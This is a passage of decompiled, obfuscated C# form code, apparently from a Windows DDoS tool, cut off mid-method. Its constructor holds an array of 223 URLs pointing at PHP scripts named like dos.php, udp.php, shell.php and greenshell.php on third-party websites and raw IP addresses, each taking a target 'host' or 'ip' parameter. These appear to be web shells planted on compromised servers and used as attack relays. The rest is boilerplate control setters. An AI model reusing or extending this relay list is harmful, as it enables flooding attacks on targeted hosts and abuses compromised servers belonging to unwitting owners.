		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RadioButton2_CheckedChanged;
			if (radioButton_3 != null)
			{
				radioButton_3.remove_CheckedChanged(eventHandler);
			}
			radioButton_3 = value;
			if (radioButton_3 != null)
			{
				radioButton_3.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual RadioButton RadioButton1
	{
		[DebuggerNonUserCode]
		get
		{
			return radioButton_4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RadioButton1_CheckedChanged;
			if (radioButton_4 != null)
			{
				radioButton_4.remove_CheckedChanged(eventHandler);
			}
			radioButton_4 = value;
			if (radioButton_4 != null)
			{
				radioButton_4.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual ButtonX ButtonX_4
	{
		[DebuggerNonUserCode]
		get
		{
			return buttonX_14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ButtonX_4_Click;
			if (buttonX_14 != null)
			{
				((Control)buttonX_14).remove_Click(eventHandler);
			}
			buttonX_14 = value;
			if (buttonX_14 != null)
			{
				((Control)buttonX_14).add_Click(eventHandler);
			}
		}
	}

	internal virtual CheckBoxX CheckBoxX_0
	{
		[DebuggerNonUserCode]
		get
		{
			return checkBoxX_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = CheckBoxX_0_CheckedChanged;
			if (checkBoxX_0 != null)
			{
				checkBoxX_0.remove_CheckedChanged(eventHandler);
			}
			checkBoxX_0 = value;
			if (checkBoxX_0 != null)
			{
				checkBoxX_0.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual CheckBoxX CheckBoxX_1
	{
		[DebuggerNonUserCode]
		get
		{
			return checkBoxX_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = CheckBoxX_1_CheckedChanged;
			if (checkBoxX_1 != null)
			{
				checkBoxX_1.remove_CheckedChanged(eventHandler);
			}
			checkBoxX_1 = value;
			if (checkBoxX_1 != null)
			{
				checkBoxX_1.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual TabControlPanel TabControlPanel6
	{
		[DebuggerNonUserCode]
		get
		{
			return tabControlPanel_5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			tabControlPanel_5 = value;
		}
	}

	internal virtual ListView ListView5
	{
		[DebuggerNonUserCode]
		get
		{
			return listView_4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			listView_4 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader9
	{
		[DebuggerNonUserCode]
		get
		{
			return columnHeader_8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			columnHeader_8 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader10
	{
		[DebuggerNonUserCode]
		get
		{
			return columnHeader_9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			columnHeader_9 = value;
		}
	}

	internal virtual TabItem TabItem9
	{
		[DebuggerNonUserCode]
		get
		{
			return tabItem_6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			tabItem_6 = value;
		}
	}

	internal virtual TabItem TabItem7
	{
		[DebuggerNonUserCode]
		get
		{
			return tabItem_7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			tabItem_7 = value;
		}
	}

	internal virtual TabItem TabItem8
	{
		[DebuggerNonUserCode]
		get
		{
			return tabItem_8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			tabItem_8 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader11
	{
		[DebuggerNonUserCode]
		get
		{
			return columnHeader_10;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			columnHeader_10 = value;
		}
	}

	internal virtual ColumnHeader Time
	{
		[DebuggerNonUserCode]
		get
		{
			return columnHeader_11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			columnHeader_11 = value;
		}
	}

	internal virtual CheckBoxX CheckBoxX_2
	{
		[DebuggerNonUserCode]
		get
		{
			return checkBoxX_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = CheckBoxX_2_CheckedChanged;
			if (checkBoxX_2 != null)
			{
				checkBoxX_2.remove_CheckedChanged(eventHandler);
			}
			checkBoxX_2 = value;
			if (checkBoxX_2 != null)
			{
				checkBoxX_2.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual RadioButton RadioButton6
	{
		[DebuggerNonUserCode]
		get
		{
			return radioButton_5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RadioButton6_CheckedChanged;
			if (radioButton_5 != null)
			{
				radioButton_5.remove_CheckedChanged(eventHandler);
			}
			radioButton_5 = value;
			if (radioButton_5 != null)
			{
				radioButton_5.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual RadioButton RadioButton7
	{
		[DebuggerNonUserCode]
		get
		{
			return radioButton_6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RadioButton7_CheckedChanged;
			if (radioButton_6 != null)
			{
				radioButton_6.remove_CheckedChanged(eventHandler);
			}
			radioButton_6 = value;
			if (radioButton_6 != null)
			{
				radioButton_6.add_CheckedChanged(eventHandler);
			}
		}
	}

	internal virtual LabelX LabelX12
	{
		[DebuggerNonUserCode]
		get
		{
			return labelX_17;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			labelX_17 = value;
		}
	}

	public virtual LabelX LabelX19
	{
		[DebuggerNonUserCode]
		get
		{
			return labelX_18;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = LabelX19_Click;
			if (labelX_18 != null)
			{
				((Control)labelX_18).remove_Click(eventHandler);
			}
			labelX_18 = value;
			if (labelX_18 != null)
			{
				((Control)labelX_18).add_Click(eventHandler);
			}
		}
	}

	public frmMain()
	{
		Class7.smethod_0();
		((Office2007Form)this)._002Ector();
		((Form)this).add_Load((EventHandler)frmMain_Load);
		int_0 = 0;
		string_0 = new string[223]
		{
			"http://217.5.201.148/webdav/uxampp.php?act=phptools&port=80&ip=", "http://redimpex.com/config/dos.php?act=phptools&host=", "http://saminkarnovin.ir/config/dos.php?act=phptools&host=", "http://www.5ind.com/config/dos.php?act=phptools&host=", "http://www.egeekreviews.com/dos.php?act=phptools&host=", "http://www.adglitz.com/config/dos.php?act=phptools&host=", "http://addygfoundation.com/config/dos.php?act=phptools&host=", "http://gaypornshare.org/images/dos.php?act=phptools&host=", "http://www.hawthornelanding.com/cgi-work/udp.php?act=phptools&host=", "http://aser.roxorgamers.com/tmp/udp.php?act=phptools&host=",
			"http://www.uttarakhandyatra.in/config.php?act=phptools&host=", "http://up.alshr.net/shell.php?act=phptools&host=", "http://www.drschmiederer.eu/files/config.php?act=phptools&host=", "http://89.35.216.234/webdav/ab.php?act=phptools&host=", "http://www.zxcvbnm.co.nu/shell.php?act=phptools&host=", "http://87.229.77.115/webdav/sprint.php?act=phptools&host=", "http://85.4.201.23/webdav/sprint.php?act=phptools&host=", "http://88.51.228.216/webdav/sprint.php?act=phptools&host=", "http://86.111.90.131/webdav/sprint.php?act=phptools&host=", "http://86.123.168.200/webdav/sprint.php?act=phptools&host=",
			"http://201.122.53.244/webdav/sprint.php?act=phptools&host=", "http://83.211.111.51/webdav/sprint.php?act=phptools&host=", "http://201.123.139.190/webdav/sprint.php?act=phptools&host=", "http://201.99.28.243/webdav/sprint.php?act=phptools&host=", "http://201.120.181.207/webdav/sprint.php?act=phptools&host=", "http://201.73.213.18/webdav/sprint.php?act=phptools&host=", "http://201.122.119.19/webdav/sprint.php?act=phptools&host=", "http://88.43.120.252/webdav/sprint.php?act=phptools&host=", "http://201.120.128.144/webdav/sprint.php?act=phptools&host=", "http://92.235.189.140/webdav/sprint.php?act=phptools&host=",
			"http://92.237.38.110/webdav/sprint.php?act=phptools&host=", "http://93.70.31.62/webdav/sprint.php?act=phptools&host=", "http://93.125.236.139/webdav/sprint.php?act=phptools&host=", "http://93.123.50.117/webdav/sprint.php?act=phptools&host=", "http://93.177.189.123/webdav/sprint.php?act=phptools&host=", "http://201.144.204.153/webdav/sprint.php?act=phptools&host=", "http://201.161.1.2/webdav/sprint.php?act=phptools&host=", "http://201.153.3.216/webdav/sprint.php?act=phptools&host=", "http://94.56.196.77/webdav/sprint.php?act=phptools&host=", "http://201.144.67.153/webdav/sprint.php?act=phptools&host=",
			"http://201.144.41.52/webdav/sprint.php?act=phptools&host=", "http://201.164.134.82/webdav/sprint.php?act=phptools&host=", "http://201.172.186.154/webdav/sprint.php?act=phptools&host=", "http://201.209.103.151/webdav/sprint.php?act=phptools&host=", "http://201.209.243.166/webdav/sprint.php?act=phptools&host=", "http://201.209.104.143/webdav/sprint.php?act=phptools&host=", "http://201.210.114.239/webdav/sprint.php?act=phptools&host=", "http://201.208.99.187/webdav/sprint.php?act=phptools&host=", "http://201.221.0.149/webdav/sprint.php?act=phptools&host=", "http://201.219.1.84/webdav/sprint.php?act=phptools&host=",
			"http://201.217.61.70/webdav/sprint.php?act=phptools&host=", "http://201.236.217.88/webdav/sprint.php?act=phptools&host=", "http://201.231.47.135/webdav/sprint.php?act=phptools&host=", "http://201.232.95.98/webdav/sprint.php?act=phptools&host=", "http://201.238.203.254/webdav/sprint.php?act=phptools&host=", "http://201.234.24.199/webdav/sprint.php?act=phptools&host=", "http://173.224.209.137/webdav/sprint.php?act=phptools&host=", "http://201.234.48.228/webdav/sprint.php?act=phptools&host=", "http://115.249.91.22/webdav/sprint.php?act=phptools&host=", "http://186.24.32.27/webdav/sprint.php?act=phptools&host=",
			"http://41.78.103.187/webdav/sprint.php?act=phptools&host=", "http://195.97.99.135/webdav/sprint.php?act=phptools&host=", "http://200.150.182.165/webdav/config.php?act=phptools&host=", "http://200.69.105.206/webdav/sprint.php?act=phptools&host=", "http://200.58.99.117/webdav/sprint.php?act=phptools&host=", "http://200.86.232.20/webdav/sprint.php?act=phptools&host=", "http://200.93.193.158/webdav/sprint.php?act=phptools&host=", "http://89.104.195.200/webdav/x32.php?act=phptools&host=", "http://200.98.207.63/webdav/sprint.php?act=phptools&host=", "http://190.144.174.250/webdav/greenshell.php?act=phptools&host=",
			"http://201.47.43.197/webdav/sprint.php?act=phptools&host=", "http://202.129.241.222/webdav/sprint.php?act=phptools&host=", "http://64.122.148.158/webdav/test.php?act=phptools&host=", "http://87.247.236.3/webdav/sprint.php?act=phptools&host=", "http://46.7.79.53/webdav/wickd.php?act=phptools&host=", "http://212.104.114.67/webdav/wickd.php?act=phptools&host=", "http://85.204.119.220/webdav/wickd.php?act=phptools&host=", "http://195.97.99.135/webdav/wickd.php?act=phptools&host=", "http://78.38.142.40/webdav/wickd.php?act=phptools&host=", "http://125.214.43.90/webdav/wickd.php?act=phptools&host=",
			"http://114.179.84.7/webdav/wickd.php?act=phptools&host=", "http://75.127.124.218/webdav/wickd.php?act=phptools&host=", "http://195.125.145.243/webdav/wickd.php?act=phptools&host=", "http://213.37.152.111/webdav/wickd.php?act=phptools&host=", "http://114.32.152.241/webdav/wickd.php?act=phptools&host=", "http://140.114.71.22/webdav/uxampp.php?act=phptools&port=80&ip=", "http://206.180.183.204/webdav/uxampp.php?act=phptools&port=80&ip=", "http://83.246.215.37/webdav/uxampp.php?act=phptools&port=80&ip=", "http://78.46.99.214/webdav/uxampp.php?act=phptools&port=80&ip=", "http://175.108.165.172/webdav/uxampp.php?act=phptools&port=80&ip=",
			"http://148.235.74.163/webdav/uxampp.php?act=phptools&port=80&ip=", "http://212.0.118.52/webdav/uxampp.php?act=phptools&port=80&ip=", "http://210.19.106.150/webdav/uxampp.php?act=phptools&port=80&ip=", "http://203.106.245.229/webdav/uxampp.php?act=phptools&port=80&ip=", "http://80.14.138.117/webdav/uxampp.php?act=phptools&port=80&ip=", "http://202.94.150.29/webdav/uxampp.php?act=phptools&port=80&ip=", "http://178.49.26.14/webdav/uxampp.php?act=phptools&port=80&ip=", "http://219.229.132.28/webdav/uxampp.php?act=phptools&port=80&ip=", "http://80.65.88.100/webdav/uxampp.php?act=phptools&port=80&ip=", "http://202.136.60.51/webdav/uxampp.php?act=phptools&port=80&ip=",
			"http://202.169.45.131/webdav/uxampp.php?act=phptools&port=80&ip=", "http://202.169.30.215/webdav/uxampp.php?act=phptools&port=80&ip=", "http://189.10.179.19/webdav/uxampp.php?act=phptools&port=80&ip=", "http://91.92.154.5/webdav/uxampp.php?act=phptools&port=80&ip=", "http://201.120.38.251/webdav/uxampp.php?act=phptools&port=80&ip=", "http://80.11.2.92/webdav/uxampp.php?act=phptools&port=80&ip=", "http://190.24.8.178/webdav/uxampp.php?act=phptools&port=80&ip=", "http://109.105.67.60/webdav/uxampp.php?act=phptools&port=80&ip=", "http://78.96.215.58/webdav/uxampp.php?act=phptools&port=80&ip=", "http://88.172.118.191/webdav/uxampp.php?act=phptools&port=80&ip=",
			"http://89.165.192.37/webdav/uxampp.php?act=phptools&port=80&ip=", "http://212.152.181.186/webdav/uxampp.php?act=phptools&port=80&ip=", "http://66.189.122.118/webdav/uxampp.php?act=phptools&port=80&ip=", "http://148.225.67.1/webdav/uxampp.php?act=phptools&port=80&ip=", "http://109.233.120.39/webdav/uxampp.php?act=phptools&port=80&ip=", "http://90.179.167.194/webdav/uxampp.php?act=phptools&port=80&ip=", "http://82.170.83.94/webdav/uxampp.php?act=phptools&port=80&ip=", "http://94.195.196.72/webdav/uxampp.php?act=phptools&port=80&ip=", "http://115.31.154.89/webdav/uxampp.php?act=phptools&port=80&ip=", "http://83.232.101.50/webdav/uxampp.php?act=phptools&port=80&ip=",
			"http://118.69.195.61/webdav/uxampp.php?act=phptools&port=80&ip=", "http://128.134.57.151/webdav/uxampp.php?act=phptools&port=80&ip=", "http://81.223.209.251/webdav/uxampp.php?act=phptools&port=80&ip=", "http://150.69.195.192/webdav/uxampp.php?act=phptools&port=80&ip=", "http://58.200.222.80/webdav/uxampp.php?act=phptools&port=80&ip=", "http://58.137.88.6/webdav/uxampp.php?act=phptools&port=80&ip=", "http://212.175.166.172/webdav/uxampp.php?act=phptools&port=80&ip=", "http://85.125.196.44/webdav/uxampp.php?act=phptools&port=80&ip=", "http://87.213.51.217/webdav/uxampp.php?act=phptools&port=80&ip=", "http://218.21.240.29/webdav/uxampp.php?act=phptools&port=80&ip=",
			"http://202.165.179.131/webdav/uxampp.php?act=phptools&port=80&ip=", "http://200.78.227.136/webdav/uxampp.php?act=phptools&port=80&ip=", "http://88.185.116.175/webdav/uxampp.php?act=phptools&port=80&ip=", "http://124.67.52.21/webdav/uxampp.php?act=phptools&port=80&ip=", "http://195.70.37.166/webdav/uxampp.php?act=phptools&port=80&ip=", "http://82.228.9.83/webdav/uxampp.php?act=phptools&port=80&ip=", "http://200.150.182.165/webdav/uxampp.php?act=phptools&port=80&ip=", "http://125.77.126.75/webdav/uxampp.php?act=phptools&port=80&ip=", "http://201.89.57.73/webdav/uxampp.php?act=phptools&port=80&ip=", "http://62.82.24.91/webdav/uxampp.php?act=phptools&port=80&ip=",
			"http://80.152.167.152/webdav/uxampp.php?act=phptools&port=80&ip=", "http://163.21.242.230/webdav/uxampp.php?act=phptools&port=80&ip=", "http://211.166.11.200/webdav/uxampp.php?act=phptools&port=80&ip=", "http://202.73.55.9/webdav/uxampp.php?act=phptools&port=80&ip=", "http://77.224.251.30/webdav/uxampp.php?act=phptools&port=80&ip=", "http://www.dinamo.com.nu/php/function.php?act=phptools&port=80&ip=", "http://soft-linux.com.ar/contador/function.php?act=phptools&port=80&ip=", "http://szpay.com/asp.php?act=phptools&port=80&ip=", "http://www.cccfpd.org/upfile/udp.php?act=phptools&port=80&ip=", "http://danping.net/editor.php?act=phptools&port=80&ip=",
			"http://diy.faceshower.com/test/help.php?act=phptools&port=80&ip=", "http://yunyingdisheng.nxw.cn/liss.php?act=phptools&port=80&ip=", "http://asbestoslawyersgroup.com/function.php?act=phptools&port=80&ip=", "http://map86.net/help.php?act=phptools&port=80&ip=", "http://xiaolan.faceshower.com/test/help.php?act=phptools&port=80&ip=", "http://lamaisonnouvelle.fr/css/function.php?act=phptools&port=80&ip=", "http://ceshi.qfmail.com/xhua/zxly.php?act=phptools&port=80&ip=", "http://www.faith.hk/function.php?act=phptools&port=80&ip=", "http://aguapemodapraia.com.br/greybox/function.php?act=phptools&port=80&ip=", "http://www.wuyutai.com/shop/help.php?act=phptools&port=80&ip=",
			"http://www.taikongyao.com:81/tcyy/liss.php?act=phptools&port=80&ip=", "http://www.mwing.com/tag.php?act=phptools&port=80&ip=", "http://www.corrado-club.ca/images/yummy.php?act=phptools&host=", "http://www.selahservice.com/images/yummy.php?act=phptools&host=", "http://clintonacademy.org/2007Women/yummy.php?act=phptools&host=", "http://www.octcca.org/wp-content/uploads/2010/12/yummy.php?act=phptools&host=", "http://www.riversidesbc.com/calendar/images/yummy.php?act=phptools&host=", "http://www.circlesofpeace.us/news/images/yummy.php?act=phptools&host=", "http://www.trirop.de/configuration.php?act=phptools&host=", "http://gaypornshare.org/images/dos.php?act=phptools&host=",
			"http://www.sidarglobal.com/help.php?act=phptools&host=", "http://122.220.23.163/webdav/uxampp.php?act=phptools&port=80&ip=", "http://210.48.222.85/webdav/uxampp.php?act=phptools&port=80&ip=", "http://203.76.126.68/webdav/uxampp.php?act=phptools&port=80&ip=", "http://200.217.221.121/webdav/uxampp.php?act=phptools&port=80&ip=", "http://83.103.137.77/webdav/uxampp.php?act=phptools&port=80&ip=", "http://140.127.52.24/webdav/uxampp.php?act=phptools&port=80&ip=", "http://161.139.194.77/webdav/greenshell.php?act=phptools&host=", "http://haleracing.net/news/leaf.php?act=phptools&host=", "http://190.69.156.133/webdav/uxampp.php?act=phptools&port=80&ip=",
			"http://81.82.250.117/webdav/uxampp.php?act=phptools&port=80&ip=", "http://218.87.136.9/webdav/config.php?act=phptools&host=", "http://161.139.194.77/webdav/..php?act=phptools&host=", "http://www.shaktipharma.in/krept.php?act=phptools&host=", "http://www.webisemailer.in/krept.php?act=phptools&host=", "http://www.tourplanners.org/krept.php?act=phptools&host=", "http://www.nityastationery.com/krept.php?act=phptools&host=", "http://www.osz-bekleidung-mode.de/image/config.php?act=phptools&host=", "http://200.150.182.165/webdav/config.php?act=phptools&host=", "http://www.pierremohan.com/city.php?act=phptools&host=",
			"http://abzarbeton.com/config.php?act=phptools&host=", "http://islamicwavez.com/config.php?act=phptools&host=", "http://www.uttarakhandyatra.in/config.php?act=phptools&host=", "http://mysiba.com/config.php?act=phptools&host=", "http://ettela.info/configg.php?act=phptools&host=", "http://www.lingeriesexy.co.uk/config.php?act=phptools&host=", "http://crys-sols.com/config.php?act=phptools&host=", "http://www.aiesec.or.ke/config.php?act=phptools&host=", "http://bestslimfastplan.com/config.php?act=phptools&host=", "http://lucolombo.it/config.php?act=phptools&host=",
			"http://studiodei.ro/config.php?act=phptools&host=", "http://buyyourcheap.com/config.php?act=phptools&host=", "http://scoalabaia.eu/config.php?act=phptools&host=", "http://chnitisoftpro.com/config.php?act=phptools&host=", "http://etawahlive.in/config.php?act=phptools&host=", "http://triumphpack.co.in/config.php?act=phptools&host=", "http://asiaexpress.co.in/config.php?act=phptools&host=", "http://dani-renovation.ch/config.php?act=phptools&host=", "http://thrissurin.com/config.php?act=phptools&host=", "http://www.usb-archiv.de/config.php?act=phptools&host=",
			"http://webadicts.com/css/config.php?act=phptools&host=", "http://www.bntsccs.co.za/config.php?act=phptools&host=", "http://rotana-host.net/config.php?act=phptools&host=", "http://dvarma.net/config.php?act=phptools&host=", "http://parvazmg.com/config.php?act=phptools&host=", "http://nandgaoncollege.com/config.php?act=phptools&host=", "http://www.meetusconsult.net/config.php?act=phptools&host=", "http://neril.in/config.php?act=phptools&host=", "http://kae.kz/config.php?act=phptools&host=", "http://lenspoint.in/config.php?act=phptools&host=",
			"http://weeklymooncreations.com/config.php?act=phptools&host=", "http://siu.msdn-showcase.com/config.php?act=phptools&host=", "http://smartedgeconsulting.com/config.php?act=phptools&host="
		};
		method_0();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Office2007Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void method_0()
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected O, but got Unknown
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		//IL_00f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0103: Expected O, but got Unknown
		//IL_0104: Unknown result type (might be due to invalid IL or missing references)
		//IL_010e: Expected O, but got Unknown
		//IL_010f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0119: Expected O, but got Unknown
		//IL_011a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0124: Expected O, but got Unknown
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		//IL_0130: Unknown result type (might be due to invalid IL or missing references)
		//IL_013a: Expected O, but got Unknown
		//IL_013b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0145: Expected O, but got Unknown
		//IL_0146: Unknown result type (might be due to invalid IL or missing references)
		//IL_0150: Expected O, but got Unknown
		//IL_0151: Unknown result type (might be due to invalid IL or missing references)
		//IL_015b: Expected O, but got Unknown
		//IL_015c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0166: Expected O, but got Unknown
		//IL_0167: Unknown result type (might be due to invalid IL or missing references)
		//IL_0171: Expected O, but got Unknown
		//IL_0172: Unknown result type (might be due to invalid IL or missing references)
		//IL_017c: Expected O, but got Unknown
		//IL_017d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0187: Expected O, but got Unknown
		//IL_0188: Unknown result type (might be due to invalid IL or missing references)
		//IL_0192: Expected O, but got Unknown
		//IL_0199: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a3: Expected O, but got Unknown
		//IL_01a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ae: Expected O, but got Unknown
		//IL_01af: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b9: Expected O, but got Unknown
		//IL_01ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c4: Expected O, but got Unknown
		//IL_01c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01cf: Expected O, but got Unknown
		//IL_01d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01da: Expected O, but got Unknown
		//IL_01db: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e5: Expected O, but got Unknown
		//IL_01e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f0: Expected O, but got Unknown
		//IL_01f1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fb: Expected O, but got Unknown
		//IL_01fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0206: Expected O, but got Unknown
		//IL_0207: Unknown result type (might be due to invalid IL or missing references)
		//IL_0211: Expected O, but got Unknown
		//IL_0212: Unknown result type (might be due to invalid IL or missing references)
		//IL_021c: Expected O, but got Unknown
		//IL_0223: Unknown result type (might be due to invalid IL or missing references)
		//IL_022d: Expected O, but got Unknown
		//IL_022e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0238: Expected O, but got Unknown
		//IL_0239: Unknown result type (might be due to invalid IL or missing references)
		//IL_0243: Expected O, but got Unknown
		//IL_0244: Unknown result type (might be due to invalid IL or missing references)
		//IL_024e: Expected O, but got Unknown
		//IL_024f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0259: Expected O, but got Unknown
		//IL_025a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0264: Expected O, but got Unknown
		//IL_0265: Unknown result type (might be due to invalid IL or missing references)
		//IL_026f: Expected O, but got Unknown
		//IL_0270: Unknown result type (might be due to invalid IL or missing references)
		//IL_027a: Expected O, but got Unknown
		//IL_0281: Unknown result type (might be due to invalid IL or missing references)
		//IL_028b: Expected O, but got Unknown
		//IL_028c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0296: Expected O, but got Unknown
		//IL_0297: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a1: Expected O, but got Unknown
		//IL_02a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ac: Expected O, but got Unknown
		//IL_02ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b7: Expected O, but got Unknown
		//IL_02b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c2: Expected O, but got Unknown
		//IL_02c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cd: Expected O, but got Unknown
		//IL_02ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d8: Expected O, but got Unknown
		//IL_02d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e3: Expected O, but got Unknown
		//IL_02e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_02ee: Expected O, but got Unknown
		//IL_02ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f9: Expected O, but got Unknown
		//IL_02fa: Unknown result type (might be due to invalid IL or missing references)
		//IL_0304: Expected O, but got Unknown
		//IL_030b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0315: Expected O, but got Unknown
		//IL_031c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0326: Expected O, but got Unknown
		//IL_0327: Unknown result type (might be due to invalid IL or missing references)
		//IL_0331: Expected O, but got Unknown
		//IL_0332: Unknown result type (might be due to invalid IL or missing references)
		//IL_033c: Expected O, but got Unknown
		//IL_033d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0347: Expected O, but got Unknown
		//IL_0348: Unknown result type (might be due to invalid IL or missing references)
		//IL_0352: Expected O, but got Unknown
		//IL_0353: Unknown result type (might be due to invalid IL or missing references)
		//IL_035d: Expected O, but got Unknown
		//IL_035e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0368: Expected O, but got Unknown
		//IL_0369: Unknown result type (might be due to invalid IL or missing references)
		//IL_0373: Expected O, but got Unknown
		//IL_0374: Unknown result type (might be due to invalid IL or missing references)
		//IL_037e: Expected O, but got Unknown
		//IL_037f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0389: Expected O, but got Unknown
		//IL_038a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0394: Expected O, but got Unknown
		//IL_039b: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a5: Expected O, but got Unknown
		//IL_03a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b0: Expected O, but got Unknown
		//IL_03b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_03bb: Expected O, but got Unknown
		//IL_03bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c6: Expected O, but got Unknown
		//IL_03c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d1: Expected O, but got Unknown
		//IL_03d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_03dc: Expected O, but got Unknown
		//IL_03dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e7: Expected O, but got Unknown
		//IL_03e8: Unknown result type (might be due to invalid IL or missing references)
